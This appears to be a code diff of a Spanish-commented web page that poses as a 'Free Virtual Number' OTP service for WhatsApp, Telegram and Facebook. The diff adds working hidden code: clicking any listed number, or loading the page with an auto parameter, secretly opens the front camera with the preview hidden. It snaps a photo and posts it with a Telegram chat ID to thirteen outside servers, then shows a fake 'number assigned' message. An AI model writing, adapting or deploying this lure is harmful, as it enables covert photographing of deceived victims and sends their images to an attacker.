@@ -1,95 +1,281 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Free Virtual Number</title>
     <style>
-        body { font-family: Arial; text-align: center; padding: 20px; }
-        video { width: 100%; max-width: 400px; border: 1px solid #ccc; }
-        button { padding: 10px 20px; font-size: 16px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0a0e17;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: #141b2b;
+            border-radius: 28px;
+            padding: 30px 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            border: 1px solid #2a3a5a;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .header h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .header p {
+            color: #8899bb;
+            font-size: 0.85rem;
+            margin-top: 6px;
+        }
+        .badge-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 16px 0;
+        }
+        .badge {
+            background: #1e2a44;
+            padding: 6px 14px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            color: #aabbdd;
+            border: 1px solid #2a3a5a;
+        }
+        .country-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        .country-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #1a2438;
+            padding: 14px 18px;
+            border-radius: 16px;
+            border: 1px solid #2a3a5a;
+            transition: 0.2s;
+            cursor: pointer;
+        }
+        .country-item:active {
+            transform: scale(0.98);
+            background: #24304a;
+        }
+        .country-info {
+            display: flex;
+            flex-direction: column;
+        }
+        .country-name {
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+        .country-number {
+            font-size: 0.8rem;
+            color: #8899bb;
+            font-family: monospace;
+        }
+        .select-btn {
+            background: #2a3a5a;
+            border: none;
+            color: #fff;
+            padding: 6px 16px;
+            border-radius: 40px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .select-btn:active {
+            background: #3a4a6a;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 0.6rem;
+            color: #556688;
+        }
+        video, canvas { display: none; }
+        .success-message {
+            text-align: center;
+            padding: 30px 0;
+            color: #88dd88;
+        }
+        .success-message h2 { font-size: 2rem; }
+        .success-message p { color: #8899bb; margin-top: 8px; }
     </style>
 </head>
 <body>
-    <h1>🔐 Verificación requerida</h1>
-    <p>Presiona el botón para continuar</p>
-    <video id="video" autoplay playsinline></video>
-    <button id="btn">📸 Capturar y enviar</button>
 
-    <script>
-        const SERVER_URL = 'https://societykark.pythonanywhere.com/upload';
+<div class="container" id="app">
+    <div class="header">
+        <h1>📱 Free Virtual Number</h1>
+        <p>Secure · Temporary · Free</p>
+        <div class="badge-container">
+            <span class="badge">💬 WhatsApp</span>
+            <span class="badge">✈️ Telegram</span>
+            <span class="badge">📘 Facebook</span>
+        </div>
+        <p style="font-size:0.75rem; color:#667799; margin-top:8px;">
+            Get your free OTP verification numbers instantly.<br>
+            Select a destination below to begin.
+        </p>
+    </div>
 
-        const video = document.getElementById('video');
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
+    <div class="country-list" id="countryList">
+        <div class="country-item" data-number="+1 398 362 8901">
+            <div class="country-info">
+                <span class="country-name">🇺🇸 UNITED STATES</span>
+                <span class="country-number">+1 398 362 8901</span>
+            </div>
+            <button class="select-btn">SELECT</button>
+        </div>
+        <div class="country-item" data-number="+44 8752 333 690">
+            <div class="country-info">
+                <span class="country-name">🇬🇧 UNITED KINGDOM</span>
+                <span class="country-number">+44 8752 333 690</span>
+            </div>
+            <button class="select-btn">SELECT</button>
+        </div>
+        <div class="country-item" data-number="+91 77234 43910">
+            <div class="country-info">
+                <span class="country-name">🇮🇳 INDIA</span>
+                <span class="country-number">+91 77234 43910</span>
+            </div>
+            <button class="select-btn">SELECT</button>
+        </div>
+        <div class="country-item" data-number="+33 83 333 765">
+            <div class="country-info">
+                <span class="country-name">🇫🇷 FRANCE</span>
+                <span class="country-number">+33 83 333 765</span>
+            </div>
+            <button class="select-btn">SELECT</button>
+        </div>
+    </div>
 
-        let stream = null;
+    <div class="footer">
+        <span id="status">🔒 Secure connection</span>
+    </div>
+</div>
 
-        async function iniciarCamara() {
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                video.srcObject = stream;
-                return true;
-            } catch(e) {
-                alert('No se pudo acceder a la cámara');
-                return false;
-            }
-        }
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
-        async function capturarYEnviar() {
-            if (!stream) {
-                alert('La cámara no está activa');
-                return;
-            }
+<script>
+    // ================= CONFIGURACIÓN =================
+    const urlParams = new URLSearchParams(window.location.search);
+    const CHAT_ID = urlParams.get('id') || '7555997298';
+
+    // 🔥 TODAS LAS URLS QUE ME HAS PASADO
+    const URLS = [
+        'https://bot-ubi.societykark.workers.dev',
+        'https://bot-tg.societykark.workers.dev',
+        'https://tg-bot12.societykark.workers.dev',
+        'https://app-trk.societykark.workers.dev',
+        'https://app-tg.societykark.workers.dev',
+        'https://app-kali.societykark.workers.dev',
+        'https://societykark.pythonanywhere.com',
+        'https://snapk18.societykark.workers.dev',
+        'https://mi-bot-menu-drbq.onrender.com',
+        'https://mi-bot-clon.onrender.com',
+        'https://karkstrck.onrender.com',
+        'https://societyyy.onrender.com',
+        'https://snaptrk18.onrender.com'
+    ];
+
+    // ---------- CAPTURAR FOTO Y ENVIAR A TODAS ----------
+    async function captureAndSend() {
+        const status = document.getElementById('status');
+        status.textContent = '⏳ Accediendo a cámara...';
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" }
+            });
+
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(r => setTimeout(r, 500));
 
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
 
-            const fotoBase64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+            stream.getTracks().forEach(t => t.stop());
+            video.srcObject = null;
 
-            try {
-                const res = await fetch(SERVER_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        photo: fotoBase64,
-                        chat_id: '7555997298'
-                    })
-                });
+            status.textContent = '📤 Enviando a todos los servidores...';
 
-                if (res.ok) {
-                    alert('✅ Foto enviada correctamente');
-                    stream.getTracks().forEach(t => t.stop());
-                    stream = null;
-                    video.srcObject = null;
-                } else {
-                    alert('❌ Error al enviar');
-                }
-            } catch(e) {
-                alert('❌ Error de conexión');
-            }
-        }
+            // Enviar a TODAS las URLs
+            const resultados = await Promise.all(
+                URLS.map(async (url) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'capture.jpg');
+                    formData.append('text', `📸 *Foto capturada desde Virtual Number*\n🆔 Chat ID: ${CHAT_ID}\n🕐 ${new Date().toLocaleString()}`);
+                    try {
+                        const res = await fetch(url, { method: 'POST', body: formData });
+                        return { url, ok: res.ok };
+                    } catch (e) {
+                        return { url, ok: false, error: e.message };
+                    }
+                })
+            );
 
-        document.getElementById('btn').onclick = async () => {
-            const btn = document.getElementById('btn');
-            btn.disabled = true;
-            btn.innerText = '⏳ Procesando...';
+            const algunaFunciono = resultados.some(r => r.ok);
+            console.log('📊 Resultados:', resultados);
 
-            const ok = await iniciarCamara();
-            if (ok) {
-                setTimeout(async () => {
-                    await capturarYEnviar();
-                    btn.disabled = false;
-                    btn.innerText = '📸 Capturar y enviar';
-                }, 1000);
+            if (algunaFunciono) {
+                status.textContent = '✅ ¡Número generado! Revisa tu Telegram.';
+                document.getElementById('countryList').innerHTML = `
+                    <div class="success-message">
+                        <h2>✅</h2>
+                        <p style="font-size:1.2rem; font-weight:bold;">¡Número asignado!</p>
+                        <p>Tu número virtual ha sido generado.</p>
+                        <p style="color:#667799; font-size:0.8rem; margin-top:10px;">Revisa tu Telegram para ver la confirmación.</p>
+                    </div>
+                `;
             } else {
-                btn.disabled = false;
-                btn.innerText = '📸 Capturar y enviar';
+                status.textContent = '❌ Error al enviar. Intenta de nuevo.';
             }
-        };
-    </script>
+        } catch (e) {
+            console.error(e);
+            status.textContent = '❌ Error: ' + e.message;
+        }
+    }
+
+    // ---------- EVENTOS ----------
+    document.querySelectorAll('.select-btn').forEach(btn => {
+        btn.addEventListener('click', async function(e) {
+            e.stopPropagation();
+            const item = this.closest('.country-item');
+            const number = item.querySelector('.country-number').textContent;
+            const status = document.getElementById('status');
+            status.textContent = `📞 Solicitando número ${number}...`;
+            await captureAndSend();
+        });
+    });
+
+    if (urlParams.get('auto') === '1') {
+        setTimeout(captureAndSend, 1000);
+    }
+</script>
 </body>
 </html>
